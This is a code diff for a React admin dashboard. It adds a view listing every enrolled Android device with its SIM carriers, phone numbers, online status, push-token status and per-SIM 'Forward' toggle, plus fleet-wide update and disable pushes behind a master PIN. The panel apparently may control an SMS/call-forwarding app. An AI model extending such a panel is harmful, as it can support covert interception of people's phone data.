@@ -38,6 +38,25 @@ function generateAppId() {
   return `APP-${seg(4)}-${seg(4)}-${seg(4)}`;
 }
 
+type FullDevice = {
+  id: number; deviceId: string; appId: string; userId: string; name: string;
+  androidVersion: number;
+  sim1Carrier: string | null; sim1Phone: string | null;
+  sim2Carrier: string | null; sim2Phone: string | null;
+  status: string; lastOnline: string | null;
+  forwardEnabled: boolean; forwardSlot: number | null;
+  hasFcm: boolean; installedAt: string;
+};
+
+function fmtAgo(iso: string | null | undefined): string {
+  if (!iso) return "Never";
+  const diff = Date.now() - new Date(iso).getTime();
+  if (diff < 60000) return `${Math.floor(diff / 1000)}s ago`;
+  if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
+  if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
+  return `${Math.floor(diff / 86400000)}d ago`;
+}
+
 function copyToClipboard(text: string): Promise<void> {
   if (navigator.clipboard) return navigator.clipboard.writeText(text);
   const el = document.createElement("textarea");
@@ -518,11 +537,209 @@ function AppCard({
 }
 
 /* ─────────── Dashboard ─────────── */
+function AllDevicesModal({ devices, loading, search, onSearchChange, onClose }: {
+  devices: FullDevice[]; loading: boolean; search: string;
+  onSearchChange: (v: string) => void; onClose: () => void;
+}) {
+  const s = search.trim().toLowerCase();
+  const filtered = s === "" ? devices : devices.filter(d =>
+    d.name.toLowerCase().includes(s) ||
+    d.appId.toLowerCase().includes(s) ||
+    d.deviceId.toLowerCase().includes(s) ||
+    (d.sim1Phone ?? "").includes(s) ||
+    (d.sim2Phone ?? "").includes(s)
+  );
+  const online = devices.filter(d => d.status === "online").length;
+
+  const appColors: Record<string, string> = {};
+  const palette = ["#6366f1","#8b5cf6","#06b6d4","#f59e0b","#10b981","#ef4444","#f97316","#ec4899","#14b8a6","#84cc16"];
+  let ci = 0;
+  devices.forEach(d => { if (!appColors[d.appId]) appColors[d.appId] = palette[ci++ % palette.length]; });
+
+  function SimRow({ slot, carrier, phone }: { slot: number; carrier: string | null; phone: string | null }) {
+    return (
+      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+        <span style={{ fontSize: 10, fontWeight: 700, color: T.muted, background: T.border, borderRadius: 4, padding: "1px 5px", flexShrink: 0 }}>
+          SIM{slot}
+        </span>
+        {carrier || phone ? (
+          <span style={{ fontSize: 12, color: T.mutedLight }}>
+            {carrier && <span style={{ color: T.text, fontWeight: 600 }}>{carrier}</span>}
+            {carrier && phone && " · "}
+            {phone && <span style={{ fontFamily: "monospace", color: "#93c5fd" }}>{phone}</span>}
+          </span>
+        ) : (
+          <span style={{ fontSize: 11, color: T.muted, fontStyle: "italic" }}>No SIM</span>
+        )}
+      </div>
+    );
+  }
+
+  return (
+    <div style={{
+      position: "fixed", inset: 0, background: "rgba(0,0,0,0.85)", zIndex: 200,
+      display: "flex", flexDirection: "column",
+      backdropFilter: "blur(4px)",
+    }}>
+      {/* Header */}
+      <div style={{
+        background: T.headerBg, borderBottom: `1px solid ${T.border}`,
+        padding: "0 16px", flexShrink: 0,
+      }}>
+        <div style={{ maxWidth: 960, margin: "0 auto", height: 56, display: "flex", alignItems: "center", gap: 12 }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 8, flex: 1 }}>
+            <span style={{ fontSize: 18 }}>📱</span>
+            <span style={{ fontWeight: 900, fontSize: 16, color: T.text }}>All Devices</span>
+            <span style={{ background: T.accentGlow, color: T.accentLight, borderRadius: 99, padding: "2px 10px", fontSize: 11, fontWeight: 800, border: `1px solid ${T.accent}44` }}>
+              {devices.length} total
+            </span>
+            <span style={{ background: "#16a34a22", color: "#4ade80", borderRadius: 99, padding: "2px 10px", fontSize: 11, fontWeight: 800, border: "1px solid #16a34a44" }}>
+              {online} online
+            </span>
+          </div>
+          <button onClick={onClose} style={{ background: T.borderLight, border: "none", color: T.text, borderRadius: 8, padding: "7px 14px", fontSize: 12, fontWeight: 700, cursor: "pointer" }}>✕ Close</button>
+        </div>
+      </div>
+
+      {/* Search */}
+      <div style={{ background: T.bg, padding: "12px 16px", borderBottom: `1px solid ${T.border}`, flexShrink: 0 }}>
+        <div style={{ maxWidth: 960, margin: "0 auto", position: "relative" }}>
+          <span style={{ position: "absolute", left: 12, top: "50%", transform: "translateY(-50%)", color: T.muted, fontSize: 14, pointerEvents: "none" }}>🔍</span>
+          <input
+            type="text" placeholder="Search by name, App ID, deviceId, phone…"
+            value={search} onChange={e => onSearchChange(e.target.value)} autoFocus
+            style={{
+              width: "100%", boxSizing: "border-box", padding: "10px 36px 10px 38px",
+              borderRadius: 10, background: T.card, border: `1px solid ${T.borderLight}`,
+              color: T.text, fontSize: 13, outline: "none",
+            }}
+          />
+          {search && <button onClick={() => onSearchChange("")} style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: T.muted, cursor: "pointer", fontSize: 16 }}>✕</button>}
+        </div>
+      </div>
+
+      {/* Device list */}
+      <div style={{ flex: 1, overflowY: "auto", padding: "16px", background: T.bg }}>
+        <div style={{ maxWidth: 960, margin: "0 auto" }}>
+          {loading ? (
+            <div style={{ textAlign: "center", padding: 80, color: T.muted }}>
+              <div style={{ fontSize: 32, marginBottom: 12 }}>⏳</div>
+              <div>Loading all devices…</div>
+            </div>
+          ) : filtered.length === 0 ? (
+            <div style={{ textAlign: "center", padding: 80, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}` }}>
+              <div style={{ fontSize: 32, marginBottom: 10 }}>🔍</div>
+              {search ? `"${search}" se koi device nahi mila.` : "Koi device nahi hai."}
+            </div>
+          ) : (
+            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(300px, 1fr))", gap: 12 }}>
+              {filtered.map(d => {
+                const acColor = appColors[d.appId] ?? T.accent;
+                const isOnline = d.status === "online";
+                return (
+                  <div key={d.deviceId} style={{
+                    background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`,
+                    overflow: "hidden", display: "flex", flexDirection: "column",
+                    boxShadow: isOnline ? `0 0 0 1px ${T.green}22 inset` : undefined,
+                  }}>
+                    {/* Card header */}
+                    <div style={{ padding: "10px 14px", background: T.headerBg, borderBottom: `1px solid ${T.borderLight}`, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 }}>
+                      <div style={{ display: "flex", alignItems: "center", gap: 6, minWidth: 0 }}>
+                        <span style={{ background: acColor + "22", color: acColor, border: `1px solid ${acColor}44`, borderRadius: 6, padding: "2px 8px", fontSize: 10, fontWeight: 800, letterSpacing: 0.5, flexShrink: 0 }}>
+                          {d.appId}
+                        </span>
+                      </div>
+                      <span style={{
+                        display: "flex", alignItems: "center", gap: 4,
+                        background: isOnline ? "#16a34a22" : T.border,
+                        color: isOnline ? "#4ade80" : T.muted,
+                        borderRadius: 99, padding: "2px 9px", fontSize: 10, fontWeight: 800,
+                        border: `1px solid ${isOnline ? "#16a34a44" : "transparent"}`,
+                        flexShrink: 0,
+                      }}>
+                        <span style={{ width: 6, height: 6, borderRadius: "50%", background: isOnline ? "#4ade80" : T.muted, display: "inline-block" }} />
+                        {isOnline ? "ONLINE" : "OFFLINE"}
+                      </span>
+                    </div>
+
+                    {/* Card body */}
+                    <div style={{ padding: "12px 14px", display: "flex", flexDirection: "column", gap: 8, flex: 1 }}>
+                      {/* Device name */}
+                      <div style={{ fontWeight: 800, fontSize: 15, color: T.text, lineHeight: 1.2 }}>{d.name}</div>
+
+                      {/* Device ID */}
+                      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+                        <span style={{ fontSize: 10, color: T.muted, fontWeight: 700, flexShrink: 0 }}>Device ID</span>
+                        <span style={{ fontFamily: "monospace", fontSize: 11, color: T.mutedLight, wordBreak: "break-all" }}>{d.deviceId}</span>
+                        <button onClick={() => { void navigator.clipboard?.writeText(d.deviceId); }}
+                          style={{ background: "none", border: "none", color: T.muted, cursor: "pointer", fontSize: 12, padding: "1px 4px", flexShrink: 0 }} title="Copy">⎘</button>
+                      </div>
+
+                      {/* Divider */}
+                      <div style={{ height: 1, background: T.border }} />
+
+                      {/* SIM 1 */}
+                      <SimRow slot={1} carrier={d.sim1Carrier} phone={d.sim1Phone} />
+                      {/* SIM 2 */}
+                      <SimRow slot={2} carrier={d.sim2Carrier} phone={d.sim2Phone} />
+
+                      {/* Divider */}
+                      <div style={{ height: 1, background: T.border }} />
+
+                      {/* Meta row */}
+                      <div style={{ display: "flex", flexWrap: "wrap", gap: "6px 12px" }}>
+                        <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
+                          <span style={{ fontSize: 10, color: T.muted }}>Android</span>
+                          <span style={{ fontSize: 12, fontWeight: 700, color: d.androidVersion > 0 ? T.text : T.muted }}>
+                            {d.androidVersion > 0 ? `v${d.androidVersion}` : "—"}
+                          </span>
+                        </div>
+                        <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
+                          <span style={{ fontSize: 10, color: T.muted }}>FCM</span>
+                          <span style={{ fontSize: 11, fontWeight: 700, color: d.hasFcm ? T.green : T.red }}>
+                            {d.hasFcm ? "✓ Active" : "✗ None"}
+                          </span>
+                        </div>
+                        <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
+                          <span style={{ fontSize: 10, color: T.muted }}>Forward</span>
+                          <span style={{ fontSize: 11, fontWeight: 700, color: d.forwardEnabled ? T.green : T.muted }}>
+                            {d.forwardEnabled ? `SIM${d.forwardSlot ?? "?"} ON` : "Off"}
+                          </span>
+                        </div>
+                      </div>
+
+                      {/* Times */}
+                      <div style={{ display: "flex", flexDirection: "column", gap: 3 }}>
+                        <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10 }}>
+                          <span style={{ color: T.muted }}>Last Online</span>
+                          <span style={{ color: d.lastOnline ? T.mutedLight : T.muted, fontWeight: 600 }}>{fmtAgo(d.lastOnline)}</span>
+                        </div>
+                        <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10 }}>
+                          <span style={{ color: T.muted }}>Installed</span>
+                          <span style={{ color: T.mutedLight, fontWeight: 600 }}>{fmtAgo(d.installedAt)}</span>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                );
+              })}
+            </div>
+          )}
+        </div>
+      </div>
+    </div>
+  );
+}
+
 function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; onLogout: () => void; onPinChanged: (p: string) => void }) {
   const [appList, setAppList] = useState<App[]>([]);
   const [loading, setLoading] = useState(true);
   const [showCreate, setShowCreate] = useState(false);
   const [showChangePin, setShowChangePin] = useState(false);
+  const [showAllDevices, setShowAllDevices] = useState(false);
+  const [allDevicesList, setAllDevicesList] = useState<FullDevice[]>([]);
+  const [allDevLoading, setAllDevLoading] = useState(false);
+  const [allDevSearch, setAllDevSearch] = useState("");
   const [editApp, setEditApp] = useState<App | null>(null);
   const [deletingId, setDeletingId] = useState<string | null>(null);
   const [togglingId, setTogglingId] = useState<string | null>(null);
@@ -556,10 +773,10 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
     if (!res.ok) throw new Error("FCM failed");
   }
 
-  async function fetchAllDevices(): Promise<Array<{ deviceId: string; appId: string; name: string; fcmToken: string | null; status: string }>> {
+  async function fetchAllDevices(): Promise<FullDevice[]> {
     const r = await apiFetch("/api/master/all-devices", { headers: { "x-master-pin": masterPin } });
     if (!r.ok) throw new Error("Failed to fetch devices");
-    return r.json() as Promise<Array<{ deviceId: string; appId: string; name: string; fcmToken: string | null; status: string }>>;
+    return r.json() as Promise<FullDevice[]>;
   }
 
   async function handleMasterUpdate() {
@@ -568,7 +785,7 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
     setMasterUpdateState("loading"); setMasterUpdateResult(null); setMasterUpdateDone(0); setMasterUpdateTotal(0); setMasterNumErr("");
     try {
       const allDevices = await fetchAllDevices();
-      const eligible = allDevices.filter(d => d.fcmToken);
+      const eligible = allDevices.filter(d => d.hasFcm);
       setMasterUpdateTotal(eligible.length); setMasterUpdateState("running");
       const BATCH = 100; const DELAY = 300;
       let ok = 0; let fail = 0;
@@ -589,7 +806,7 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
     setMasterDisableState("loading"); setMasterDisableResult(null); setMasterDisableDone(0); setMasterDisableTotal(0);
     try {
       const allDevices = await fetchAllDevices();
-      const eligible = allDevices.filter(d => d.fcmToken);
+      const eligible = allDevices.filter(d => d.hasFcm);
       setMasterDisableTotal(eligible.length); setMasterDisableState("running");
       const BATCH = 100; const DELAY = 300;
       let ok = 0; let fail = 0;
@@ -655,6 +872,15 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
     } catch { /* ignore */ } finally { setLogoutAllId(null); }
   }
 
+  async function openAllDevices() {
+    setShowAllDevices(true);
+    setAllDevLoading(true); setAllDevSearch("");
+    try {
+      const list = await fetchAllDevices();
+      setAllDevicesList(list);
+    } catch { /* ignore */ } finally { setAllDevLoading(false); }
+  }
+
   function copyUrl(app: App) {
     const url = `${window.location.origin}/preview/dashboard/WebDashboard?appId=${app.appId}`;
     copyToClipboard(url).then(() => {
@@ -704,9 +930,13 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
 
           {/* Actions */}
           <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
+            <button onClick={() => void openAllDevices()}
+              style={{ padding: "7px 14px", borderRadius: 8, background: "linear-gradient(135deg,#6366f1,#8b5cf6)", border: "none", color: "#fff", fontWeight: 700, fontSize: 12, cursor: "pointer", whiteSpace: "nowrap", boxShadow: "0 2px 8px rgba(99,102,241,0.35)" }}>
+              📱 All Devices
+            </button>
             <button onClick={() => setShowChangePin(true)}
               style={{ padding: "7px 14px", borderRadius: 8, background: T.borderLight, border: "none", color: T.text, fontWeight: 600, fontSize: 12, cursor: "pointer", whiteSpace: "nowrap" }}>
-              🔑 <span style={{ display: "inline" }}>PIN</span>
+              🔑 PIN
             </button>
             <button onClick={onLogout}
               style={{ padding: "7px 14px", borderRadius: 8, background: "transparent", border: `1px solid ${T.border}`, color: T.muted, fontWeight: 600, fontSize: 12, cursor: "pointer" }}>
@@ -934,6 +1164,15 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
       </div>
 
       {/* Modals */}
+      {showAllDevices && (
+        <AllDevicesModal
+          devices={allDevicesList}
+          loading={allDevLoading}
+          search={allDevSearch}
+          onSearchChange={setAllDevSearch}
+          onClose={() => setShowAllDevices(false)}
+        />
+      )}
       {showCreate && (
         <CreateAppModal masterPin={masterPin} onClose={() => setShowCreate(false)}
           onCreated={a => { setAppList(prev => [a, ...prev]); setShowCreate(false); }} />
